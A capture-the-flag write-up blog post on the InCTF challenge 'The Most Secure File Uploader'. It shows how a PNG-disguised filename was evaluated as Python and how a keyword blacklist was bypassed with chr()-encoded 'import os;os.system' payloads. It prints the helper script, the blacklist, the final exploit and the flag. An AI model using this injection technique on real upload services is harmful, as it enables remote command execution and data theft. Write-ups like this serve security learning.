---
layout: post
title: "InCTF: The Most Secure File Uploader"
date: 2018-10-07
excerpt: "From file upload to python RCE. Who would've guessed the solution had to do with the chr() and ord() functions?"
tags: [CTF, Python, Jail]
comments: true
feature: https://news-images.vice.com/images/articles/meta/2015/07/31/alabama-cops-allegedly-brought-a-python-into-jail-to-torture-an-inmate-1438382699.jpg?crop=1xw:0.918918918918919xh;0xw,0.04054054054054054xh&resize=1200:*&output-format=image/jpeg&output-quality=75
---

# InCTF: The Most Secure File Uploader

This was the first challenge I completed on InCTF. The first thing we get is:

![Img](/assets/posts_details/InCTF/File_uploader/intro.png "Img")

So going to the page we check that we need to upload a file.

![Img](/assets/posts_details/InCTF/File_uploader/page.png "Img")

At first I tried to upload a ``.txt`` file but the output was that I needed an image file:

![Img](/assets/posts_details/InCTF/File_uploader/format.png "Img")

With that in mind, I changed my file to mimic a PNG. In order to do that I did two things.

1. I changed the extension from ``.txt`` to ``.png``
2. I added to my file the PNG file header, which is ``89 50 4E 47 0D 0A 1A 0A``.

Then, I tried to upload it again. However, a strange error took place:

![Img](/assets/posts_details/InCTF/File_uploader/error.png "Img")

Mmmmm... That's odd. My filename was ``experiment.png`` and the error, which comes from a python program, indicates that the variable 'name' does not exist. I tried to print something (assuming we were using python 2.x) and so that I didn't get any errors I decided to comment the file extension:

![Img](/assets/posts_details/InCTF/File_uploader/first.png "Img")

Looks like we have some kind of blacklist in which the plus sign is included, so I tried with python 3.x print syntax.

![Img](/assets/posts_details/InCTF/File_uploader/second.png "Img")

And voilà! We managed to get command execution! Our ``A`` was printed after everything else!

Once here, I decided to look at variables in the source code, maybe the flag is there. Nonetheless, ``locals`` was blacklisted and ``dir()`` wasn't useful at all.

![Img](/assets/posts_details/InCTF/File_uploader/third.png "Img")

Nothing. Then, I thought maybe the flag was in an external file, so I tried importing the ``os`` module. But guess what? ``Import`` was blacklisted as well.

### Solution

I finally found a solution to bypass the blacklist and be able to import modules. It consisted basically of using the ``chr()`` function, which turns a decimal integer into its corresponding ASCII character. Checking that it works:

![Img](/assets/posts_details/InCTF/File_uploader/fourth.png "Img")

Then, I decided to use the following code:

```py
list = "import os;os.system('ls')"
command = []
for i in list:
    command.append("chr({})".format(ord(i)))
eval(''.join(command))
```

And it turned out to work!!!

![Img](/assets/posts_details/InCTF/File_uploader/fifth.png "Img")

Now we can only change the command from ``ls`` to ``cat *`` and we'll get the source code of flag and the other two files!

![Img](/assets/posts_details/InCTF/File_uploader/sixth.png "Img")

A noticeable thing is the blacklist and the fact that the script checked if the file had both a valid header and extension.

Blacklist:

``"import|os|class|subclasses|mro|request|args|eval|if|for|\%|
subprocess|file|open|popen|builtins|\+|compile|execfile|from_pyfile|config|local|\`|\||\&|\;|\{|\}"``

Final exploit:

```py
exec(''.join([chr(105),chr(109),chr(112),chr(111),chr(114),chr(116),chr(32),chr(111),chr(115),chr(59),chr(111),chr(115),chr(46),chr(115),chr(121),chr(115),chr(116),chr(101),chr(109),chr(40),chr(39),chr(99),chr(97),chr(116),chr(32),chr(42),chr(39),chr(41)]))#.png
```

And we get our flag: ``inctf{w0w_pyth0n_mad3_my_lif3_s0_3z}``.
